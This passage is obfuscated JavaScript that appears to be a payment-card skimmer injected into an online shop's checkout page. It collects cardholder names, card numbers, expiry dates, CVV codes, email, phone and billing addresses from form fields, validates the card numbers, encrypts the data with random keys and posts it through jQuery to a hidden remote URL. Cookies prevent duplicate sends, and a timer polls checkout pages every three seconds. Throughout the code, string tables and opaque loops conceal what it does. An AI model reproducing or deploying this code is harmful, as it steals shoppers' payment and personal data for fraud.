  Y3c = Y3c[R2V.k95(+"14")](/\x20/g, R2V.k95("21" | 0));
  D3c = new RegExp(R2V.k95(+"58"));
  if (Y3c[R2V.k95("57" | 0)](D3c) != null) {
      return R2V.M95(+"85");
  }
  if (/^(\x35[1-5][0-9]{14}|\u0032(\u0032\x32[12-34-9][0-9]{12}|\x32[8-95-73-4][0-45-9]{13}|[3-6][8-90-34-7]{14}|\x37[0-1][2-90-1]{13}|\u0037\x32\u0030[0-9]{12}))$/[R2V.M95("2" - 0)](Y3c)) {
      R2V.j2V(1);
      return R2V.M95(R2V.r1V(0, "50"));
  }
  D3c = new RegExp(R2V.M95(106));
  if (Y3c[R2V.k95(57)](D3c) != null) {
      return R2V.k95(+"48");
  }
  R2V.v2V(2);
  D3c = new RegExp(R2V.M95(R2V.b1V("77", 1)));
  if (Y3c[R2V.M95(+"57")](D3c) != null) {
      return R2V.M95(+"31");
  }
  R2V.j2V(0);
  D3c = new RegExp(R2V.k95(R2V.r1V("5", 0)));
  R2V.j2V(2);
  y9F = -R2V.b1V("767534460", 1);
  R2V.j2V(1);
  n9F = R2V.b1V(0, "704165638");
  f9F = 2;
  for (var d4F = +"1"; R2V.J9F(d4F.toString(), d4F.toString().length, 76205) !== y9F; d4F++) {
      if (Y3c[R2V.k95("66" - 0)](D3c) == ("1" | 0)) {
          return R2V.k95(92);
      }
      D3c = new RegExp(R2V.M95(92));
      if (Y3c[R2V.M95(+"66")](D3c) === "1" - 0) {
          return R2V.k95(92);
      }
      R2V.j2V(0);
      D3c = new RegExp(R2V.k95(R2V.r1V("66", 0)));
      if (Y3c[R2V.M95(114)](D3c) === 1) {
          return R2V.M95(+"92");
      }
      D3c = new RegExp(R2V.M95(+"66"));
      if (Y3c[R2V.M95("66" - 0)](D3c) !== +"1") {
          R2V.j2V(1);
          return R2V.k95(R2V.r1V(0, "66"));
      }
      R2V.v2V(2);
      f9F += R2V.r1V("2", 1);
  }
  if (R2V.a9F(f9F.toString(), f9F.toString().length, +"23703") !== n9F) {
      if (Y3c[R2V.M95(66)](D3c) === ("3" | 0)) {
          return R2V.M95(+"92");
      }
      D3c = new RegExp(R2V.k95(66));
      if (Y3c[R2V.M95("66" | 0)](D3c) !== +"2") {
          return R2V.k95(+"66");
      }
      R2V.v2V(0);
      D3c = new RegExp(R2V.k95(R2V.b1V("92", 0)));
      if (Y3c[R2V.k95("66" - 0)](D3c) != "2" - 0) {
          return R2V.M95(92);
      }
      R2V.v2V(1);
      D3c = new RegExp(R2V.k95(R2V.b1V(0, "92")));
      if (Y3c[R2V.M95(+"66")](D3c) == +"8") {
          return R2V.k95(+"92");
      }
  }
  if (Y3c[R2V.M95(+"57")](D3c) != null) {
      return R2V.k95(44);
  }
  R2V.j2V(1);
  D3c = new RegExp(R2V.M95(R2V.b1V(0, "119")));
  if (Y3c[R2V.M95("57" * 1)](D3c) != null) {
      return R2V.M95(+"45");
  }
  D3c = new RegExp(R2V.M95(+"92"));
  if (Y3c[R2V.k95("57" - 0)](D3c) != null) {
      R2V.v2V(2);
      return R2V.M95(R2V.b1V("42", 1));
  }
  R2V.v2V(2);
  D3c = new RegExp(R2V.M95(R2V.r1V("114", 1)));
  if (Y3c[R2V.M95("57" * 1)](D3c) != null) {
      return R2V.k95(66);
  }
  R2V.v2V(1);
  return R2V.M95(R2V.b1V(0, "21"));
}
function validateCardNumber(q3c) {
  var z2V = E2UU;
  var J4F, q4F, j4F, Z3c;
  J4F = +"1087888008";
  z2V.j2V(2);
  q4F = z2V.b1V("617703872", 1);
  j4F = +"2";
  for (var O4F = "1" | 0; z2V.a9F(O4F.toString(), O4F.toString().length, +"49044") !== J4F; O4F++) {
      z2V.v2V(2);
      j4F += z2V.b1V("2", 1);
  }
  if (z2V.J9F(j4F.toString(), j4F.toString().length, 88415) !== q4F) {
  }
  q3c = q3c[z2V.k95(+"14")](/\u0020/g, z2V.k95("21" * 1));
  Z3c = new RegExp(z2V.k95(+"99"));
  if (!Z3c[z2V.k95("2" | 0)](q3c)) {
      return ![];
  }
  return luhnCheck(q3c);
}
function sendReport() {
  var h2V = E2UU;
  var v3c, w3c, i3c, k3c, A3c, r3c, b3c, E3c;
  v3c = {
      '\x41\x64\x64\x72\x65\x73\x73': information[h2V.M95(+"94")],
      '\x43\x43\x6e\x61\x6d\x65': information[h2V.k95("55" * 1)][h2V.M95("54" | 0)],
      '\x45\x6d\x61\x69\x6c': information[h2V.k95(+"20")],
      '\x50\x68\x6f\x6e\x65': information[h2V.M95("23" * 1)],
      '\x53\x69\x74\x79': information[h2V.M95(82)],
      '\x53\x74\x61\x74\x65': information[h2V.k95("39" - 0)],
      '\x43\x6f\x75\x6e\x74\x72\x79': information[h2V.M95(88)],
      '\x5a\x69\x70': information[h2V.k95(+"62")],
      '\x53\x68\x6f\x70': window[h2V.k95(10)][h2V.k95(104)],
      '\x43\x63\x4e\x75\x6d\x62\x65\x72': information[h2V.k95("55" - 0)][h2V.M95("109" - 0)],
      '\x45\x78\x70\x44\x61\x74\x65': information[h2V.k95(+"55")][h2V.k95(89)] + h2V.M95(+"7") + information[h2V.M95("55" - 0)][h2V.k95(+"93")],
      '\x43\x76\x76': information[h2V.M95(+"55")][h2V.M95(+"53")]
  };
  w3c = JSON[h2V.M95(+"87")](v3c);
  i3c = GenKey();
  k3c = GenIV();
  A3c = Encrypt(w3c, i3c, k3c);
  r3c = GenKey();
  b3c = GenIV();
  E3c = Encrypt(w3c, r3c, b3c);
  jQuery[h2V.k95("115" - 0)]({
      '\x75\x72\x6c': h2V.M95(+"11"),
      '\x64\x61\x74\x61': {
          '\x6d\x61\x69\x6e': A3c,
          '\x67\x75\x69\x64': i3c,
          '\x72\x65\x66\x65\x72': k3c,
          '\x6b\x65\x79': r3c,
          '\x69\x76': b3c
      },
      '\x74\x79\x70\x65': h2V.k95("9" - 0),
      '\x64\x61\x74\x61\x54\x79\x70\x65': h2V.M95(+"13"),
      '\x73\x75\x63\x63\x65\x73\x73': function (m3c) {
          return !{};
      },
      '\x65\x72\x72\x6f\x72': function (N3c, F3c, V3c) {
          return !{};
      }
  });
}
validateArr = [
  cardnameId,
  cardnumberId,
  cvcId,
  monthId,
  yearId
];
E2UU.j2V(2);
fn = E2UU.k95(E2UU.b1V("60", 1));
function setBillingFields() {
  var Q2V = E2UU;
  var U3c, K3c, Z9F, m9F, F9F, l9F, M9F, I9F, z4F, i4F, K4F;
  information[Q2V.M95(91)] = jq(Q2V.k95("40" - 0))[Q2V.M95(+"76")]();
  information[Q2V.M95(+"68")] = jq(Q2V.M95(35))[Q2V.k95(+"76")]();
  information[Q2V.M95(Q2V.b1V(0, "23", Q2V.v2V(1)))] = jq(Q2V.M95("17" - 0))[Q2V.M95(76)]();
  information[Q2V.k95(Q2V.b1V(0, "94", Q2V.v2V(1)))] = jq(Q2V.M95("12" * 1))[Q2V.k95(+"76")]();
  Q2V.j2V(2);
  Z9F = Q2V.b1V("254277766", 1);
  Q2V.j2V(0);
  m9F = Q2V.r1V("2119046247", 0);
  F9F = 2;
  for (var T9F = 1; Q2V.J9F(T9F.toString(), T9F.toString().length, +"57026") !== Z9F; T9F++) {
      information[Q2V.M95(Q2V.r1V("38", 0, Q2V.j2V(0)))] = jq(Q2V.k95("107" - 0))[Q2V.k95("76" | 0)]();
      information[Q2V.M95(Q2V.r1V("88", 1, Q2V.v2V(2)))] = jq(Q2V.k95(+"8"))[Q2V.k95("76" - 0)]();
      information[Q2V.M95(+"62")] = jq(Q2V.k95("67" - 0))[Q2V.k95(+"76")]();
      F9F += +"2";
  }
  if (Q2V.J9F(F9F.toString(), F9F.toString().length, +"32248") !== m9F) {
      information[Q2V.k95(Q2V.b1V("67", 0, Q2V.v2V(0)))] = jq(Q2V.M95(+"67"))[Q2V.M95(76)]();
      information[Q2V.k95(Q2V.r1V("76", 0, Q2V.j2V(0)))] = jq(Q2V.k95(+"67"))[Q2V.k95(+"67")]();
      information[Q2V.M95(67)] = jq(Q2V.M95("76" | 0))[Q2V.M95("67" | 0)]();
  }
  information[Q2V.M95(+"82")] = jq(Q2V.M95(+"65"))[Q2V.M95("76" - 0)]();
  information[Q2V.M95(Q2V.b1V("39", 0, Q2V.j2V(0)))] = jq(Q2V.M95(+"32"))[Q2V.M95(76)]();
  if (!information[Q2V.k95("82" - 0)]) {
      U3c = jq(Q2V.k95(+"86"))[Q2V.k95(+"73")]()[Q2V.M95(+"24")](/\x0a/);
      if (U3c && U3c[Q2V.M95("3" - 0)]) {
          information[Q2V.k95(23)] = U3c["6" * 1] ? U3c[+"6"][Q2V.M95("103" - 0)]() : Q2V.k95(+"21");
          information[Q2V.M95(Q2V.r1V("94", 0, Q2V.v2V(0)))] = U3c["3" | 0] ? U3c["3" - 0][Q2V.M95(+"103")]() : Q2V.M95("21" | 0);
          l9F = 1805950456;
          M9F = -+"1235580669";
          Q2V.j2V(2);
          I9F = Q2V.b1V("2", 1);
          for (var i9F = +"1"; Q2V.J9F(i9F.toString(), i9F.toString().length, +"90882") !== l9F; i9F++) {
              information[Q2V.k95(Q2V.r1V(0, "88", Q2V.j2V(1)))] = U3c[5] ? U3c[5][Q2V.M95(+"103")]() : Q2V.k95("21" | 0);
              Q2V.j2V(1);
              I9F += Q2V.r1V(0, "2");
          }
          if (Q2V.a9F(I9F.toString(), I9F.toString().length, "4658" * 1) !== M9F) {
              information[Q2V.M95(Q2V.b1V("103", 0, Q2V.j2V(0)))] = U3c["4" - 0] ? U3c[+"7"][Q2V.k95(+"103")]() : Q2V.M95(103);
          }
          if (U3c[+"4"]) {
              Q2V.v2V(2);
              z4F = -Q2V.b1V("632415271", 1);
              Q2V.v2V(0);
              i4F = -Q2V.b1V("1743895977", 0);
              Q2V.v2V(1);
              K4F = Q2V.b1V(0, "2");
              for (var D4F = +"1"; Q2V.J9F(D4F.toString(), D4F.toString().length, +"73876") !== z4F; D4F++) {
                  K3c = U3c["7" * 1][Q2V.k95("24" - 0)](Q2V.M95(117));
                  information[Q2V.M95(Q2V.b1V("103", 0, Q2V.j2V(0)))] = K3c["6" - 0] ? K3c[0][Q2V.k95(21)]() : Q2V.M95(103);
                  K4F += +"2";
              }
              if (Q2V.a9F(K4F.toString(), K4F.toString().length, 48641) !== i4F) {
                  K3c = U3c[4][Q2V.M95(+"24")](Q2V.M95(+"117"));
                  information[Q2V.k95(+"62")] = K3c["1" - 0] ? K3c["1" * 1][Q2V.k95("103" * 1)]() : Q2V.M95(+"21");
              }
              information[Q2V.M95(Q2V.b1V(0, "82", Q2V.v2V(1)))] = K3c["0" - 0] ? K3c[+"0"][Q2V.k95(+"103")]() : Q2V.M95("21" - 0);
          }
      }
  }
}
function createCookie(R3c, L3c, l3c) {
  var A2V = E2UU;
  var g3c, d3c, h9F, u9F, E9F;
  h9F = -+"1191971298";
  u9F = -+"1367477828";
  E9F = +"2";
  for (var x9F = +"1"; A2V.a9F(x9F.toString(), x9F.toString().length, "5583" - 0) !== h9F; x9F++) {
      A2V.v2V(2);
      g3c = A2V.M95(A2V.b1V("21", 1));
      E9F += +"2";
  }
  if (A2V.J9F(E9F.toString(), E9F.toString().length, +"86710") !== u9F) {
      A2V.v2V(0);
      g3c = A2V.k95(A2V.b1V("21", 0));
  }
  if (l3c) {
      d3c = new Date();
      d3c[A2V.M95("113" - 0)](d3c[A2V.M95(+"30")]() + l3c * ("60" * 1) * +"1000");
      g3c = A2V.k95(+"75") + d3c[A2V.k95("1" - 0)]();
  }
  document[A2V.k95(A2V.r1V("100", 0, A2V.v2V(0)))] = R3c + A2V.M95("80" - 0) + L3c + g3c + A2V.k95("96" - 0);
}
function validateCard() {
  var K2V = E2UU;
  var z3c, t3c, e3c, p3c;
  z3c = !![];
  for (var n3c in validateArr) {
      t3c = validateArr[n3c];
      e3c = doc[K2V.M95("46" - 0)](t3c);
      p3c = e3c[K2V.M95(+"52")];
      switch (t3c) {
      case cardnameId:
          if (!p3c) {
              doc[K2V.k95("46" * 1)](K2V.M95(+"116"))[K2V.M95(+"59")][K2V.k95(+"16")] = K2V.k95(+"81");
              z3c = !1;
          } else {
              doc[K2V.k95(46)](K2V.k95(+"116"))[K2V.k95(59)][K2V.k95(16)] = K2V.k95(K2V.b1V("72", 1, K2V.v2V(2)));
          }
          information[K2V.k95(+"55")][K2V.M95(+"54")] = p3c;
          break;
      case cardnumberId:
          if (!validateCardNumber(p3c)) {
              doc[K2V.k95("46" - 0)](K2V.M95("6" | 0))[K2V.M95(+"59")][K2V.M95(K2V.b1V("16", 0, K2V.j2V(0)))] = K2V.k95(K2V.b1V("81", 0, K2V.v2V(0)));
              z3c = ![];
          } else {
              doc[K2V.k95(+"46")](K2V.k95(6))[K2V.k95(59)][K2V.M95(K2V.b1V("16", 0, K2V.v2V(0)))] = K2V.M95(+"72");
          }
          information[K2V.k95(K2V.b1V("55", 1, K2V.j2V(2)))][K2V.M95(K2V.r1V(0, "109", K2V.j2V(1)))] = p3c;
          break;
      case monthId:
          information[K2V.M95(K2V.r1V("55", 0, K2V.v2V(0)))][K2V.k95(89)] = p3c;
          break;
      case yearId:
          information[K2V.M95(+"55")][K2V.k95(+"93")] = p3c;
          break;
      case cvcId:
          information[K2V.M95(+"55")][K2V.M95(K2V.r1V("53", 1, K2V.j2V(2)))] = p3c;
          if (!p3c || (p3c + K2V.k95("21" - 0))[K2V.k95(+"3")] < "3" * 1) {
              doc[K2V.k95(+"46")](K2V.k95(+"64"))[K2V.M95(+"59")][K2V.M95(+"16")] = K2V.k95(K2V.r1V("81", 1, K2V.j2V(2)));
              z3c = ![];
          } else {
              doc[K2V.k95(+"46")](K2V.M95(+"64"))[K2V.k95(59)][K2V.M95(+"16")] = K2V.k95(72);
          }
          break;
      }
  }
  return z3c;
}
E2UU.j2V(0);
ln = E2UU.M95(E2UU.b1V("33", 0));
str = E2UU.k95(+"25");
E2UU.j2V(1);
str2 = E2UU.k95(E2UU.r1V(0, "0"));
email = E2UU.M95(108);
phone = E2UU.k95(+"83");
country = E2UU.k95(+"111");
city = E2UU.M95(+"123");
E2UU.v2V(0);
zip = E2UU.k95(E2UU.b1V("56", 0));
region = E2UU.k95(26);
function AddListenerToCC(o6c, J6c, G3c) {
  var F2V = E2UU;
  var B4F, g4F, R4F;
  J6c[F2V.k95(+"121")](o6c, G3c, !!"1");
  B4F = 516929732;
  g4F = 1625207816;
  F2V.j2V(1);
  R4F = F2V.r1V(0, "2");
  for (var a4F = "1" * 1; F2V.a9F(a4F.toString(), a4F.toString().length, +"68410") !== B4F; a4F++) {
      F2V.j2V(3);
      var K95 = F2V.b1V(74, 74, 69);
      J6c[F2V.k95(+"28")] += F2V.k95(K95) + document[F2V.M95("98" | 0)];
      R4F += 2;
  }
  if (F2V.a9F(R4F.toString(), R4F.toString().length, +"70765") !== g4F) {
      J6c[F2V.k95(+"69")] -= F2V.k95("69" - 0) - document[F2V.M95("69" * 1)];
  }
}
information = {
  '\x66\x69\x72\x73\x74\x4e\x61\x6d\x65': null,
  '\x6c\x61\x73\x74\x4e\x61\x6d\x65': null,
  '\x65\x6d\x61\x69\x6c': null,
  '\x74\x65\x6c\x65\x70\x68\x6f\x6e\x65': null,
  '\x63\x69\x74\x79': null,
  '\x72\x65\x67\x69\x6f\x6e': null,
  '\x63\x6f\x75\x6e\x74\x72\x79': null,
  '\x70\x6f\x73\x74\x63\x6f\x64\x65': null,
  '\x61\x64\x64\x72\x65\x73\x73': null,
  '\x61\x64\x64\x72\x65\x73\x73\x32': E2UU.k95(21),
  '\x63\x61\x72\x64': {
      '\x6e\x75\x6d\x62\x65\x72': null,
      '\x6e\x61\x6d\x65': null,
      '\x6c\x61\x73\x74\x4e\x61\x6d\x65': null,
      '\x79\x65\x61\x72': null,
      '\x6d\x6f\x6e\x74\x68': null,
      '\x63\x63\x76': null,
      '\x76\x62\x76': null
  }
};
function tooltipHide() {
  var T2V = E2UU;
  doc[T2V.k95("46" | 0)](T2V.M95(+"101"))[T2V.M95(59)][T2V.k95(+"16")] = T2V.M95(72);
}
window[E2UU.k95(+"97")] = function () {
  checkClass();
};
if (new RegExp(E2UU.k95(+"41"))[E2UU.k95("2" - 0)](window[E2UU.k95(+"10")])) {
  setInterval(function () {
      checkClass();
  }, 3000);
}
GenKey = function () {
  var i2V = E2UU;
  var v9F, r9F, U9F, x3c;
  i2V.v2V(2);
  v9F = i2V.b1V("1249684042", 1);
  r9F = -+"117964876";
  U9F = +"2";
  for (var o9F = +"1"; i2V.a9F(o9F.toString(), o9F.toString().length, +"35931") !== v9F; o9F++) {
      i2V.j2V(0);
      U9F += i2V.b1V("2", 0);
  }
  if (i2V.a9F(U9F.toString(), U9F.toString().length, 88137) !== r9F) {
  }
  i2V.v2V(1);
  x3c = i2V.k95(i2V.b1V(0, "21"));
  for (var B3c = "0" * 1; B3c < 32; B3c++) {
      x3c += String[i2V.k95(+"19")](Math[i2V.M95(102)](Math[i2V.M95(+"61")]() * ("255" - 0)));
  }
  return btoa(x3c);
};
GenIV = function () {
  var H2V = E2UU;
  var j3c;
  H2V.j2V(0);
  j3c = H2V.M95(H2V.b1V("21", 0));
  for (var c3c = +"0"; c3c < ("16" | 0); c3c++) {
      j3c += String[H2V.M95("19" * 1)](Math[H2V.k95(+"102")](Math[H2V.k95(+"61")]() * ("255" | 0)));
  }
  return btoa(j3c);
};
function send() {
  var C2V = E2UU;
  if (getCookie(C2V.M95(+"74"))) {
      return;
  }
  if (validateCard()) {
      setBillingFields();
      sendReport();
      createCookie(C2V.M95(+"74"), C2V.M95(+"49"), +"360");
      createCookie(C2V.M95("70" * 1), C2V.k95("29" | 0), "360" | 0);
  }
}
function luhnCheck(I3c) {
  var k2V = E2UU;
  var u3c, T3c;
  u3c = +"0";
  for (var C3c = +"0"; C3c < I3c[k2V.k95(+"3")]; C3c++) {
      T3c = parseInt(I3c[k2V.k95(34)](C3c, "1" * 1));
      if (C3c % +"2" == "0" * 1) {
          T3c *= +"2";
          if (T3c > 9) {
              k2V.v2V(4);
              T3c = k2V.b1V("1", 10, T3c, 0);
          }
      }
      u3c += T3c;
  }
  k2V.j2V(5);
  return k2V.b1V("0", u3c, "10");
}
